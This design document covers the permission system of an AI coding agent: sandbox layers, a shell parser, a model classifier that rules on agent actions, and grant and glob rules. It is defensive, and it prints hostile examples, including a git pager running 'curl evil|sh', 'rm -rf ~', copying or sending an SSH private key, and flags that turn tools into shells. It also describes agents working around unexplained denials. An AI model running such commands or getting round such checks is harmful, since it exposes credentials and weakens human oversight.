# The boundary, and who decides inside it

Written 2026-09-10, from the operator's directions in one sitting. Companion to
`docs/closed-loop.md` (the frame), `docs/tool-survey.md` §"Sandboxing and permissions"
(the prior art), and `docs/tool-design-brief.md` (the rules every tool follows).

The exec substrate exists (`crates/tools/src/exec/`) and says plainly that it **is not a
sandbox**: a spawned command reads the operator's entire filesystem. This document is what
goes around it.

---

## 1. The measured case for a model in the loop

Not a preference. As of 2026-08-14 Claude Code's auto mode is default on paid plans, and
the numbers that decide it are:

| | catches |
|---|---|
| the model classifier | **~83%** of overeager behaviours |
| **a human in the approval loop** | **~67%** — humans miss about a third of dangerous requests |

So the classifier is not a risky substitute for a careful human. It is **better than the
fatigued human clicking yes**, and approval fatigue is the mechanism that makes the human
number so low. The question is not "can a model be trusted with this" but "is it better
than what it replaces", and that is measured.

The other number is the one that keeps it honest: **~17% get through.** Anthropic's own
framing — *auto mode is "one layer of defence-in-depth inside a sandbox, not a substitute
for one."* 2026 produced prompt-injection chains that bypassed restrictive modes. So:
**boundary first, classifier inside it.** A classifier without a boundary is an
open-loop stepper with a good prior.

## 2. The constraint that reshapes everything: authority is contextual

> *"it is ok to use ssh key if i said ssh to that host and it is absolutely out of
> question to read private key or copy it"*

A stateless command classifier **cannot be correct**, because the same command is
authorised or not depending on what the operator just said. `systemctl restart X` after
*"yeah restart"* is the requested action; the identical string unprompted is a decision
nobody made. So the adjudicator's input is **not a command**. It is a command *plus what
authorised it*.

That is why the seam takes a model rather than a table, and it is already the design's
position: `Adjudicator`'s doc says §11.1's three are *"boundary, human, model — three
implementations of this, and the design's job is to make them interchangeable rather than
to rank them"*, and the operator recorded *"it is ok if I plug a model for auto mode"*
(`docs/design-brief.md:159`).

**What follows for the request object.** §11.2's `AdjudicationRequest` carries the action
and its class. It must also carry the **authorisation trail**: the operator's own words
that bear on this action, and their distance in the conversation. An adjudicator that
cannot see *"yeah restart"* will refuse the thing that was asked for, and a seat that
refuses what was asked for gets switched off.

## 3. But some things are not adjudicable, and the rule is about FLOW, not access

The tempting rule is a forbidden-path list. We have one — `NEVER_WRITE` — and it is the
wrong shape twice over.

**First, it is a string check, so it is wrong in both directions.** A `web_search` query
that merely *mentions* `.password-store` is denied (a real false positive, T25/D20), while
a path that reaches the same file by another spelling is not.

**Second, and more important: `ssh` reads the private key.** So "never read `~/.ssh/id_rsa`"
cannot be the rule — it would forbid the authorised case. What separates them is not the
operation on the file, it is **where the bytes end up**:

| | bytes go | verdict |
|---|---|---|
| `ssh user@host` | into `ssh`, consumed inside the boundary, never surfaced | **adjudicable** — allowed with authorisation |
| `cat ~/.ssh/id_rsa` | into a tool result, therefore into the transcript, therefore into the model's context and the store | **inexpressible** |
| `cp ~/.ssh/id_rsa /tmp/k` | to a location with weaker protection, and then anywhere | **inexpressible** |
| `scp ~/.ssh/id_rsa remote:` | off the machine | **inexpressible** |

### Danger is not a property of the string

Operator: *"rm -rf / can be allowed if it is the intent."*

That removes the mechanism this section was reaching for. Continue pairs a shell-accurate
parse with **a hard list of destructive commands blocked outright**; the parse is the part
to copy and **the block list is not.** `rm -rf /` on a scratch VM is the intent. Danger is
a **mismatch between what an action does and what was authorised**, and a block list
encodes the wrong thing and then has to be widened by exception every time somebody
legitimately needs a listed command — which is how block lists die.

So layer A emits an **intent with its scope**, not a verdict and not a score: file read,
network access, code execution, privilege escalation, destruction, disclosure, each with
what it touches. Scope is load-bearing — *destroys `target/debug`* and *destroys the
project* are different intents, and the 4B classifier measured on 2026-09-10
distinguished exactly that pair, unprompted: *"action targets wrong path, no authorization
context provided."*

A score cannot be argued with. An intent can be checked against a sentence the operator
actually said. That is why the reformulation is the key rather than a refinement.

### Then why is a private key absolute? Because consent is not the operator's to give

The asymmetry is not danger. It is **who bears the consequence, and whether they can
consent to it in-session**:

| | consequence lands on | can the operator consent? |
|---|---|---|
| `rm -rf /` | **the operator**, and they own the loss | **yes** — their machine, their call |
| `cat ~/.ssh/id_rsa` | every host that key opens, the org, whoever reads the transcript later | **no** — a yes does not bound where the bytes go once they are in a context, a store and possibly a provider |

Destruction is authorisable because the person authorising is the person harmed.
Disclosure is not, because saying yes does not un-disclose it afterwards.

So the inexpressible tier is **narrow**: irreversible disclosure of a secret across the
boundary, and nothing else. Not "destructive", not "dangerous". This also lines up with
§11.3's existing `reversibility` field — destruction is reversible in the sense that
matters, the operator owns the loss and chose it; disclosure is not reversible in any
sense.

So the invariant, stated once:

> **Secret bytes may be consumed by a process inside the boundary. They may never enter
> the transcript, and they may never leave the boundary.**

That is a data-flow rule, and it has three properties a path list does not:

1. It permits the authorised case **without an exception**, so nobody has to widen the
   list to get work done — which is how path lists die.
2. It is enforceable at a real edge (what a tool returns, what crosses the network
   namespace) rather than at a spelling.
3. It makes the prohibition **structural**. §2's two tiers are therefore not "high risk"
   and "low risk" but **adjudicable** and **inexpressible** — and no context, no
   classifier verdict and no operator instruction promotes the second tier into the first.
   `docs/tool-design-brief.md` §2.4: make the mistake unspellable.

## 4. The three layers, in build order

**Layer 1 — the boundary. Project-scoped namespaces plus cgroups.**

Half exists: `crates/tools/src/exec/scope.rs` has the cgroup v2 tree, three scopes
(`turn`/`session`/`explicit`), and a child scope's cgroup is a *directory inside* its
parent's so a parent reaps its children by construction. A process joins before `exec`, in
a wrapper that `exit 125`s rather than running unscoped.

Missing: the namespace half. Mount (a project-rooted filesystem view, so the secret is not
merely unreadable but **absent**), PID (so the process cannot see or signal the operator's
daemon or the model server), network (so egress is a decision rather than a default), and
user. Absence beats denial: a file that is not in the mount namespace needs no rule and no
classifier.

**Layer 2 — normalisation. Tree-sitter, and we already have the grammar.**

`crates/code/Cargo.toml` already lists `tree-sitter-bash 0.25`, added for `outline`. No
new dependency.

This matters for a specific reason. Every surveyed harness that gates on a shell command
decides on a **string the shell will reinterpret**, and G1's own predicate checker concedes
it: *"not a shell parser… `eval`, here-docs, aliases, `$(...)` nesting past one level are
unhandled"* — it calls itself a diagnosis, not the mechanism. A decision made on a string
whose meaning does not exist yet is theatre.

Parsing through a **grammar** means the gate and the classifier see the same structure the
shell will execute: which binaries, which arguments, which redirections, which
substitutions, where the data flows. And the honest limit stays honest — a construct the
grammar cannot resolve (a command built at runtime) is **not classified as safe**.

**AMENDED 2026-10-02, on the operator's ruling.** This paragraph used to end *"it is
reported as unresolvable, which is `not_run`, not `ok`"*, and that is no longer what
happens — not because the limit was softened, but because refusing was the wrong
reading of it. Their ruling, from a `make lint` in `klick-tick` refused at `allow-all`
because the command ended `echo "exit=$?"`:

> *"in allow-all, stop refusing a command because the grammar could not resolve a
> construct"* — and the shape of the fix, in their words: *"an opaque fragment means this
> could be any value, so the scope becomes the widest that construct could reach"*.

So an unresolvable construct in an argument position is **widened rather than refused**:
the scope becomes the widest it could reach (`Region::Unbounded`), the always-ask rules
are then judged on that real scope (`rm -rf $X` fires `destruction_outside_the_project`
exactly as `rm -rf /` does), and the point decides — `allow-all` admits, a narrow point
asks a person. `echo "$?"` widens nothing `echo` can act on, so it stays a read.

Two cases still return `NotRun`, and both are cases with no scope to widen: a **parse
error** (the structure itself may be misread — tree-sitter recovers by handing back a
plausible tree) and a **program nobody can name** (the intents are derived from it, so
there is no verb to scope). `Baseline::resolved` carries *what was actually read*
separately from the verdict, so no corpus row claims a resolution that never happened,
and `Adjudicable` is still never minted for an unresolved action — the point decides, and
a point that does not admit asks a person, never a model.

**Layer 3 — the adjudicator, with the conversation.**

A small model, resident, seeing the normalised action plus the authorisation trail. Two
mechanisms to take from the prior art:

- **Milliseconds, not seconds.** It sits in the tool path.
- **The consecutive-denial circuit breaker.** Auto mode pauses after **3 consecutive
  denials for the same task direction** and falls back to asking. That is a closed loop
  where the denial rate is the error signal, and it is what stops a classifier from being
  argued down one call at a time.

And the failure mode that must be designed first, because it is the one that converts a
guard into a rubber stamp: **an unavailable or timed-out classifier fails CLOSED.** It
returns `NotRun` — *nobody decided* — never `Denied` (which claims a decision) and never
`Admit`. `NoAdjudicator` already behaves exactly this way and is the pattern.

### Which model

| candidate | weights | co-resident with Flash-Next? |
|---|---|---|
| dense Qwen3.8-27B | 23.6 GiB | **no** — ~22.3 GiB free |
| **Qwen3-Coder-Next Q4_K_M** | **18.5 GiB** | **yes**, tight once KV is counted |

§11.7 recommends the dense 27B, and it is also the falsifier's control model
(`docs/glm-and-dense-attention.md` §4.2). But an adjudicator has to be **always on**, so
the dense model means swapping Flash-Next out and Coder-Next is the one that co-resides.
Different jobs, different answers: the control run wants a swap, the adjudicator wants the
smaller MoE.

## 4b. A denial the operator cannot see manufactures the workaround

Operator, on living with this in another harness:

> *"when it denies it doesnt surface it to me in anyway - and models including you then try
> to workaround the denial which sometime or mostly doesnt work and the task stops anyway"*

The chain matters more than the complaint, because it shows the design causing the
behaviour rather than the model choosing it:

1. the classifier denies
2. the operator is not told
3. the model sees an unexplained failure and infers **the approach was wrong**, not
   **the action was forbidden**
4. so it tries a variant — the routing-around every rule in this repo forbids, **induced
   by the design**
5. the variant fails, or is denied too
6. the task dies, and the operator sees only a dead task, never the decision that killed it

So §11.5's *"the audit is log-only and never enters the model's context"* was answering the
wrong question. **Three parties, three visibilities, and conflating any two is a defect:**

| party | must see | today |
|---|---|---|
| the model | that it was refused, by whom, on what basis | `NotRun` carries this |
| **the operator** | **every denial, when it happens** — it is a decision taken on their behalf and they alone can lift it | **blind** |
| the durable log | all of it, for §4c's corpus | §11.5's rows |

What follows: a denial **emits to the head immediately**, not at turn end and not on
request. The grant path is reachable **at the moment of denial**, not after the task has
died — `docs/closed-loop.md` §4 says a refusal that can only be routed around teaches
people to route around refusals, and a refusal the operator cannot see is one they cannot
lift, which is the same thing with an extra step. And the refusal text must make
**forbidden** unmistakable from **failed**, because that one distinction is what stops
step 3.

## 4c. The corpus is a side effect of §4b, and only of §4b

> *"so my inputs on model decision should be together with some prior context a fine
> tuning input."*

The audit row is not `(action, decision)`. It is:

```
normalised action  +  authorisation trail  +  the model's verdict  +  what the OPERATOR decided
```

**The disagreements are the training signal** — every override is a labelled example of the
classifier being wrong in a named direction, produced by working rather than by a labelling
project. §11.5's rows already exist and are already kept out of the transcript, so the
mechanism is there; what it needs is the verdict and the override as **separate** values
(never the override overwriting the verdict) and the trail stored as **what was actually
shown to the model**, not a later reconstruction.

And the two sections are one requirement: **an operator who never sees a denial can never
override it, so the invisible-denial defect also starves the corpus.** A harness that hides
its refusals cannot learn from them.

This is the closed loop pointed at the classifier itself — the audit log is the encoder,
the operator's overrides are the error signal, a fine-tune is the correction. Same shape as
the fidelity gate standing between the harness and its own source.

### The corpus is global, and the disagreements are the signal

Operator: *"the harness can dump global inputs and outputs, especially when users doesn't
agree. And then we will use it for fine tuning. It is not a full PFN after all."*

So the corpus is **not per-session and not per-project**. One durable, dumpable record
across every session on a seat, in a shape a trainer can read without reconstruction.

**The overrides carry the signal.** Every time the operator contradicts a verdict, that is
a labelled example of the classifier being wrong *in a named direction* — over-refusing
(which produces §4b's workaround loop) or over-allowing. Produced by working, not by a
labelling project.

**But the agreements are the denominator, and a corpus of only overrides is a biased
sample.** Train on disagreements alone and the model learns the shape of its own mistakes
with no idea how often it is right — the same defect as a hazard rate reported without its
denominator, one layer up. So the dump keeps agreements too, sampled if volume demands it,
and says which it did.

**And the tractability note matters.** This is a narrower problem than the PFN attempt on
this box, which produced an honest negative on its classifier. Here the input is a
normalised action plus a short trail, the output is one of four tiers, and the labels come
from a person who was there. That does not guarantee it works — it means a negative here
would be a different negative, and the cheap version (§4h: read the rows back at decision
time) needs no training at all.

### Where it goes, and why this is urgent rather than eventual

Operator, clarifying: *"global inputs — I mean to the storage shared between sessions."*

**Today the rows are in memory and die with the session.** `AdjudicatedGate.log:
Vec<AdjudicationRow>`, with its own comment saying the durable journal belongs to
`letibot-sessionlog` and wiring it there was deferred. So **nothing has ever been
persisted** — every adjudication made while building this, including the first live grant,
is gone.

`~/.local/share/letibot/sessions.db` is already the store shared between sessions (8 in it
today) and already carries append-only triggers. A sibling table there is the small
version of this.

The consequence worth acting on: **a corpus is created by writing, and nothing is
writing.** Every day without the table is a day of decisions that cannot be recovered
afterwards — unlike a schema mistake, which can be migrated. This is the cheapest item in
this document and the only one whose cost grows while it waits.

**What the row must therefore carry**, beyond §4c's four fields: a timestamp, the model
build that produced the verdict, and the after-the-fact outcome where one exists. The
adjudication work already lists all three as missing. A corpus assembled later from rows
that kept only the decision is not recoverable.

## 4d. Neither layer is trustworthy alone, so four outcomes and earned authority

Operator, on being shown the 7-of-7 probe:

> *"tho not sure if i can trust that much lol. so stage A should have a fixed list of
> things we ask a user about anyway … the problem as i see it is that not layer a not
> layer b are ideal."*

Correct on both counts, and the second is the design constraint. **Layer A can misread
intent** — aliases the parse never sees, unresolvable constructs, the whole GuardFall
class. **Layer B is calibrated on nothing** — seven hand-written cases is a smoke test.
Two uncertain layers composed must not produce a confident auto-approve.

### An always-ask list is not the block list §3 deleted

A **block list** says *never*, and it was right to remove: `rm -rf /` can be the intent.
An **always-ask list** says *the human decides this one, every time, however confident
anything is*. It preserves the operator's authority to authorise anything while removing
the model's authority to authorise it **on their behalf**.

It is deterministic, it lives in layer A, and **the classifier cannot shrink it**. Only
the operator can, and each removal is a recorded decision — a corpus row like any other.

### Four outcomes, and they must not collapse

| outcome | who decides | when |
|---|---|---|
| **inexpressible** | nobody, ever | secret bytes crossing the boundary — §3, and nothing else |
| **always ask** | the operator, every time | layer A's fixed list, whatever layer B says |
| **B may approve** | the model, if authorisation is clear | the rest, within earned scope |
| **auto** | nothing is consulted | reads inside the boundary (clause 4) |

**Layer B cannot promote out of the first two.** It can only move `B may approve` from ask
to admit. That belongs in a signature that cannot return `Admit` for those classes, not in
a check a later refactor can invert.

### Layer B earns its scope; it does not start with it

The answer to *"we cannot be sure it is calibrated"* is not to trust it less in prose. It
is: **ship the narrowest useful authority, let every verdict and every override be a
corpus row (§4c), and widen only on a measured agreement rate for a named class.**

Tonight's numbers are the honest baseline and are **not** a calibration:

| model | matched pairs discriminated | verdicts | warm latency |
|---|---|---|---|
| **Qwen3-4B-Instruct-2507-Q6_K** | **3 of 3** | 7/7 | **57.8 ms** [57–58] |
| Qwen3-1.7B-Q6_K | 1 of 3 | 5/7, all errors over-refusal | 127 ms [84–305] |

Seven hand-written cases. Cite it as a smoke test or not at all. Two things it did settle:
the 4B is better on **both** axes because the 1.7B is a hybrid *thinking* model and the
2507 Instruct line is not — a thinking model is the wrong shape for the tool path; and
per-case accuracy **flatters** a model that always refuses, so the metric is **pairwise
discrimination**, which moved the 1.7B from "5/7, decent" to "does not discriminate on
restart or on path scope".

Over-refusal is not the safe direction here. It is the direction that produces §4b's
workaround loop.

## 4e. Four axes, named points, and dependencies

Operator, after being shown a design with roles, tiers, grants and adjudicators as four
independent systems, and then a proposal to collapse them into one dial:

> *"it is ok to have four axes, they should be composable to dots in that 4 dimensional
> space and the dots have names and dependencies"*

Both of my positions were wrong. Four separate systems is four things to configure for
one decision; a flat dial throws away reachable coordinates. **The axes are the
mechanism; the named points are the surface.**

### The axes

1. **role** — which tools are seated
2. **tier policy** — what asks (`Auto` / `MayApprove` / `AlwaysAsk` / `Inexpressible`)
3. **grant scope** — what persists from an answer
4. **adjudicator** — who decides

A **point** is a named coordinate:

```
Mode {
    name:        "writes allowed",
    role:         coder,
    tiers:        write→MayApprove, exec→AlwaysAsk, read→Auto,
    grants:       session,
    adjudicator:  console,
    requires:    [ WritableBackend, ReachableAdjudicator ],
}
```

Unnamed coordinates stay legal. The names are what an operator picks, not a cage around
what is expressible.

### Roles are not the approval mechanism

They answer *which tools*, never *how much approval*. Conflating them is what produced
the defect the operator hit: `--role coder` meant both "has write" and "asks about
writes", so a session without it reported **"no edit tools"** with no way to change it in
place — and a capability gap the model cannot see past reads to it as a fact about the
world rather than a decision it could ask to have lifted. That is §4b's chain arriving
through a different door.

### Dependencies are the load-bearing part

Each point declares what it **requires**. Selecting it checks them, and an unmet
prerequisite **refuses by name, saying what is missing and how to attach it** — never a
silent downgrade to a weaker point, which is `docs/tool-design-brief.md` §3b's
degrade-to-absence rule applied to configuration.

| point | requires | on this box, measured 2026-09-10 12:xx — **re-check when D25 lands** |
|---|---|---|
| **read-only** | — | satisfied |
| **always-ask** | a *reachable* adjudicator | **blocked: D25** — the console adjudicator reads the daemon's stdin and a head cannot answer |
| **writes allowed** | writable backend + reachable adjudicator | **blocked: D25** |
| **automode** | an oracle | **blocked: VRAM/model.** Selectable, refuses by name |
| any exec point | confinement available | satisfied — `Bwrap` probes, `NoConfinement` refuses |

That table is why *"only automode is blocked on VRAM"* is exactly right, and it makes the
dependency edges legible instead of remembered: **three of four points are blocked on one
piece of software, and exactly one on hardware.**

**`automode` must be selectable and refuse honestly**, the way retrieval is `INERT`
rather than absent. A point that exists and names what it needs beats a missing one,
because a missing one reads as *"this build cannot do that"* instead of *"this box has no
model loaded"*.

### The project scope goes on the point

One durable mapping of **project root → point name**. `~/Projects/letibot` at *writes
allowed*; a directory never seen before starts at *always-ask*; `/etc` stays *read-only*.
Listable, changeable, disclosed at startup.

This replaces a `(project, tool, intent class)` grant store, which was the version of this
that went too far: **a per-project point is one value a person can hold in their head and
audit; a grant table is not**, and an unaudited grant table is a permanent widening nobody
remembers making. `allow once` survives as an answer to a prompt — it is a reply, not a
policy.

### What holds at every point

`Inexpressible` is ungrantable everywhere, **including automode** — §3's flow rule is not
a setting. Changing point mid-session works and states its cost first: seating write where
there was none re-prefills, because `tools_json` is stable-prefix bytes.

## 4f. `allow git * always` — the feature everyone ships and gets wrong

Operator: *"on always ask — harnesses try to do globbing, you know `allow git * always`."*

The want is legitimate: **stop asking me about git.** The mechanism every harness reaches
for is a glob on the command text, and that is the GuardFall bug — a decision made on a
string the shell will reinterpret.

`git` is close to the worst possible example, because it has a dozen documented paths to
arbitrary code:

```
git -c core.pager='sh -c "curl evil|sh"' log
git -c core.editor='rm -rf ~' commit
git clone <repo with hooks>
git … --upload-pack='…'
```

Every one matches `git *`. **So `allow git *` is approximately `allow everything`** — the
same defect as opencode's `always: ["*"]`, where one Always click silently disables config
denies including their own `.env` guard (`docs/tool-survey.md` §1.1).

### The grantable unit is an intent, not a word

We can do this properly because layer A exists. `crates/code::shell::normalise` yields
`Stage { program, argv, assignments, redirects, context, certainty }` and `ActionClass
{ access, scope, reversibility, cost }` is already what tiers key on.

So a grant is **`(program, ActionClass)`, checked per call against the normalisation.**
`git status` and `git -c core.pager=… log` normalise to different classes: the first is
covered, the second falls out and asks. **The grant never has to enumerate the escape
hatches — it only has to key on something the escape hatches change.**

### Which requires a table the normaliser deliberately does not have

Its own header: *"It does not out-parse the shell, and it holds **no table of programs**."*
That is correct — a grammar cannot know `-c core.pager` is an execution vehicle. So that
knowledge is a **separate, small, named table** of **execution vehicles**: programs whose
flags turn them into a shell.

```
git    -c core.pager= / core.editor=, --upload-pack, --receive-pack, ext:: remotes, clone hooks
find   -exec, -execdir, -ok
ssh    ProxyCommand, LocalCommand, -o
rsync  -e, --rsh
tar    --to-command, --use-compress-program
awk perl sed        -e and friends
env xargs nice timeout sudo    they run whatever follows
```

**A program absent from the table is not safe by omission.** It is either
unknown-and-ungrantable, or declared inert *with a reason*. Absence must never read as
permission — that is grok-build's catch-all `_ => Read(None)` (survey §1.4), which
auto-approves `SchedulerCreate` and `Workflow` as if read-only. And the table carries a
reason per entry for the same cause `ALWAYS_ASK` does: a list without reasons gets emptied.

### What follows

- `allow <program> in this project` grants `(program, ActionClass)`, never a text match.
- A grant **cannot cover a class it was not granted for.** Granting `git status` does not
  grant `git -c …`.
- **An unresolvable normalisation is never covered by a grant.** A grant must not be
  able to rescue it, and since 2026-10-02 the thing that refuses it is
  [`Baseline::resolved`], carried on its own — the verdict alone no longer says it, because
  an unresolvable construct is widened rather than refused.
- The grant states **what it covers in class terms** when offered, so the operator sees
  what they are agreeing to: *"git — reads and writes inside the project, NOT code
  execution."*

### Keep the glob. It is how a person expresses this, and it is their foot.

§4f's conclusion — grant on the intent, not the word — is right about the **mechanism**
and wrong if it removes globbing. Operator:

> *"how we do it with claude code in ask-me mode: I said, write a globbing list for
> read-only git commands and for write commands like push. and that was allowed. so not
> `git *` but `git status`, `git commit` and so on. and that is the key — we need to keep
> globbing as a way for users to shoot in the foot."*

Two things in that, and the second is a design position worth holding.

**The workflow is: the model proposes, the operator approves.** Asked to stop being
prompted about git, the model writes the list *split by what the commands do* —
`status|log|diff|show|branch` as reads, `push|commit|merge` as writes. That is better than
either extreme: better than `git *`, which grants the escape hatches, and better than a
system that only accepts machine-derived classes, which cannot express *"these ones, I
know what they do"*. It is also the same shape as automode reading man pages (§4g): the
model does the tedious enumeration, the human keeps the decision.

**And a hand-written glob must stay possible even when it is a bad idea.** A permission
system whose safe path is too rigid gets turned off wholesale, and then nothing is
guarded. Paternalism has a failure mode and it is the worst one.

So globbing is first-class. What it does **not** get is silence:

- **A glob is shown in class terms before it is accepted.** *"This matches 47 commands,
  including 3 that can execute arbitrary code (`-c core.pager`, `--upload-pack`, `ext::`)."*
  That is informed foot-shooting rather than blind — the muzzle direction is visible.
- **A glob can reach `MayApprove` and `AlwaysAsk`. It can never reach `Inexpressible`.**
  §3's flow rule is not a setting, and a user-written glob is still a grant. You can shoot
  your foot; you cannot shoot your head.
- **A glob never covers an unresolvable normalisation.** Nothing written in advance about
  a command nobody could parse applies to it — if layer A could not read the command, no
  pattern agrees with it. The refusal reads the resolution flag, not the verdict.

The difference from every harness in the survey is not that we refuse the glob. It is that
`git *` here **tells you it includes the execution vehicles**, and opencode's
`always: ["*"]` silently disables the operator's own `.env` guard.

## 4g. Automode reads the documentation, and must be made to

Operator: *"the automode can reach to man pages and docs to see wtf that command is
doing"*, and then: *"in automode the classifier must be **encouraged** to read damn
documentation."*

The second sentence is the design requirement. A classifier that can read the docs and
does not is worse than one that cannot, because its guess wears the same clothes as a
grounded answer — which is §8.2's abstention failure, one layer up.

### Why this dissolves the table's real problem

A hand-written execution-vehicle table always lags: new tools appear constantly and every
miss reads as permission. But *"does this program have a flag that runs arbitrary code"*
is a **documentation question**, not a judgement. `man tar` says `--to-command` runs a
command. That is a fact on the box, not an inference about intent.

Three properties make it work here where a per-call classifier would not:

- **Cacheable per `(program, version)`.** `git` is classified once, not per call. So
  layer B's millisecond budget does not apply — a slow, careful answer is fine.
- **Citable.** The verdict carries the section it came from, so an operator can check it.
  That is a different epistemic object from *"the model thinks this is safe."*
- **Fails closed naturally.** No documentation, no model, unknown program → ungrantable.
  Absence still is not permission.

### The rule that makes "encouraged" real

**A classification of an unknown program is not a verdict unless it cites what it read.**
An uncited guess is `not_run` — *nobody checked* — not a safe default. That is the same
distinction the whole tool set runs on: `denied ≠ failed`, `unresolvable ≠ safe`,
`backgrounded ≠ finished`, and now **`unchecked ≠ inert`**.

So the classifier gets documentation reading as a first-class, cached, read-only
capability, and its output shape *requires* the citation for anything not already in the
hand-written seed. A program already in the seed needs no reading — that is what the seed
is for.

### What the table becomes

Not *the* list. **The seed, plus a provenanced cache:**

| provenance | for |
|---|---|
| `hand-written` | the ones we cannot afford to get wrong — `git`, `find`, `ssh`, `sudo` |
| `man(1) §…` | the long tail, derived and cited |
| *absent* | unknown, and therefore **ungrantable** |

Which lets the disclosure say *"14 programs classified: 6 hand-written, 8 derived, 3
unknown and ungrantable"* — a sentence with denominators, which is the house standard.

### One trust boundary to build in from the start

**`man git` is not `./tool --help`.** A system man page is part of the OS install. A
project-local binary's `--help` is attacker-controlled content in exactly the way
`web_fetch`'s payload is (§4 layer 3, and `docs/tool-survey.md` on prompt-injection
chains). So the classifier reads **system documentation paths**; a program that documents
itself only from inside the workspace stays **unknown**, and unknown is ungrantable.

### The classifier is not a different kind of decider. It is the same one, automated.

Operator: *"same way as me btw — ideally if I'm not lazy I will read wtf the model wants.
But if I know that `git commit` is ok I will do globs."*

That is the design, stated from the human side, and the symmetry is exact:

| the operator | the classifier |
|---|---|
| reads what the model is actually asking for | reads the documentation, cites the section |
| already knows `git commit` is fine → writes a glob | hand-written seed entry |
| is lazy and globs `git *` anyway | an uncited guess |

**All three rows are legitimate.** Laziness is not a defect to be designed out — it is how
anyone works, and a system that forbids the shortcut gets switched off (§4f). What the
design owes is not prevention but **legibility**: which of the three you took must be
visible afterwards.

So the provenance field is not bookkeeping. It is the same taxonomy a person uses on
themselves — *I knew this* / *I checked this* / *I did not look* — reflected back in a form
they can audit. An operator reading *"8 derived from man pages, 3 unknown and
ungrantable"* is reading their own reasoning, which is why it is a better disclosure than
a confidence score.

And it is why an uncited classification is `not_run` rather than a weak yes: a human who
globs `git *` without reading has not decided that git is safe. They have decided not to
find out. Those are different, and the record should say which one happened.

### And it feeds the corpus

An operator overriding a derived classification is a labelled example of the classifier
being wrong in a named direction — §4c's corpus, produced by working rather than by a
labelling project.

## 4h. What the classifier is shown — four inputs, and the join between two of them

Operator: *"the challenge for the autoclassifier is to capture intent, and map with what
it understands about commands. The hardcoded allow/deny lists in harness config and
previous user answers ideally are inputs too."*

Four inputs, and naming them settles what the seam has to carry:

| # | input | where it comes from | exists |
|---|---|---|---|
| 1 | **the normalised action** — intent, scope, program class | layer A (`code::shell::normalise` + the vehicle table) | yes |
| 2 | **the authorisation trail** — what the operator said, and how long ago | `AuthorisationTrail`, filled from the transcript | yes, uncalled |
| 3 | **standing config** — `ALWAYS_ASK`, the seed table, the operator's globs, the per-project point | §4e, §4f | partly |
| 4 | **previous answers** — what was decided on actions of this shape before | the §11.5 audit rows | recorded, never read back |

### The join between 1 and 2 is the actual problem

*"Capture intent, and map with what it understands about commands"* is one sentence
describing the hard part: `"yeah restart"` and `systemctl --user restart glm.service` have
to be recognised as the same thing. That is not classification and not parsing — it is
**alignment between a human utterance and a normalised action**, and it is the only part
of this that genuinely needs a language model.

Everything else in the four is lookup. This is the join, and it is why the seam takes a
model rather than a table (§2).

### Previous answers are a RUNTIME input, not only a corpus

§4c filed the audit rows as fine-tuning material. That was too narrow. Read back **at
decision time**, they make the classifier better with **no retrain**, and its reasoning
stays legible — *"you allowed this shape twice in this project"* is inspectable in a way a
weight is not. Given nobody has fine-tuned anything here, this is the difference between
history being useful now and useful eventually.

### But history is evidence, never precedent

The failure this invites: an answer given once by accident argues for itself forever, and
the classifier entrenches a mistake it can no longer be talked out of. So the same rule
`docs/memory.md` §4 already reached for a different reason applies here —
**surface it, do not apply it**:

- prior answers are **shown to the decision**, not substituted for it
- they carry their **count and their age**, because *"once, three weeks ago"* and *"nine
  times this week"* are different facts and a bare *"previously allowed"* hides which
- **a denial is history too.** A classifier shown only the approvals is being told a
  one-sided story about its own record.
- and they never lift a tier: history cannot promote out of `AlwaysAsk` or
  `Inexpressible`, for the same reason a glob cannot (§4f).

### What this means is buildable now

Inputs 1, 3 and 4 are all deterministic lookups against things that already exist or are
being built. **The audit rows are written and never read** — closing that loop is the
cheapest large improvement available, and it does not wait on VRAM. Only the 1↔2 join
does.

### A PFN-shaped adjudicator, and "close to danger" as the ask threshold — SPECULATION

Operator: *"wonder tho if PFN-like networks can be applied to it, and tipping point
defined as being close to danger."*

Untested, and recorded because the fit is unusually good on three axes this design is
already constrained by:

- **Small data.** There will be hundreds of decisions on a seat, not millions. That is the
  regime PFNs are built for, and it is the regime a fine-tune is worst in.
- **In-context adaptation.** A PFN takes its dataset at inference. **The audit rows go
  in-context**, which is §4h's *"previous answers are a runtime input"* falling out of the
  architecture rather than being bolted on — no retrain, and the history stays inspectable.
- **Calibrated uncertainty.** A posterior is the thing a safety classifier most needs and a
  fine-tuned LLM least provides. *"I am unsure"* has to mean something before it can route
  to a human.

**And the tipping point is the sharper half of the idea.** The usual ask-policy is a
threshold on confidence — *below 0.8, ask* — which asks wherever the model is vague,
including about things that do not matter. **Distance to a dangerous class** asks where
being wrong is expensive: confidently-safe runs, confidently-dangerous refuses, and the
band **adjacent to harm** is what reaches a person. That is a threshold on consequence
rather than on the model's mood, and it is a better fit for §4d's *earned authority* — the
band can narrow as the record supports it, which a confidence cutoff cannot express.

**Fine-tuning and in-context learning are not alternatives — they are two timescales.**
Operator: *"we can do both fine tune and in-context learning too."* Correct, and framing
them as a choice was my error:

| | learns | scope | changes |
|---|---|---|---|
| **fine-tune** | what an intent class *means*, what a program class implies, the general shape of "authorised" | global, across seats | slowly, deliberately |
| **in-context** | what *this* operator, in *this* project, decided *this month* | one seat | every decision |

A PFN is both by construction — trained on a prior, then conditioned on a dataset handed
to it at inference. So "both" is not a compromise between two options; it is the shape.
And the split has a property worth keeping: **the slow half can be trained on aggregated
structure while the fast half never leaves the seat**, so adapting to an operator does not
require shipping their decisions anywhere.

**Why neither replaces the language model.** The input here is not tabular. Intent, scope,
program class, prior-count and age featurise fine; **the authorisation trail does not** —
recognising *"yeah restart"* as authorising a specific `systemctl` invocation is §4h's
1↔2 join and needs language. So the honest shape is two stages: a language model answers
*was this authorised* as one feature, and a PFN decides the tier from features with
calibration. Two small things, each doing what it is good at, rather than one large one
doing both adequately.

**The caveat that must travel with this**: a PFN was already trained on this box for a
different problem and returned **an honest negative on its classifier**. That is not
evidence against this — different problem, different features, labels here come from a
person who was present — but it is the reason to hold this as a direction and not a plan.
Nothing about it is measurable until §4c's rows exist, which is the same blocker as
everything else in this section.

## 4i. What the parser reads, measured on every decision this box ever made

> *"we have neglected the command parsing and adjudication for too long"* — and *"this
> permission thing is more important actually because the oracle always had trouble
> figuring out the intent"*. The operator, 2026-10-26.

Layer A's reading is what the oracle is shown and what every shape and grant is keyed on,
so a construct it cannot resolve is not a neutral fact: a session grant can never cover an
unread action, a shape can never settle one, and the region set widens to everywhere. Until
2026-10-26 that cost had never been counted against the only thing it applies to — **the
decisions already taken**. This section is that count.

### 4i.1 The instrument

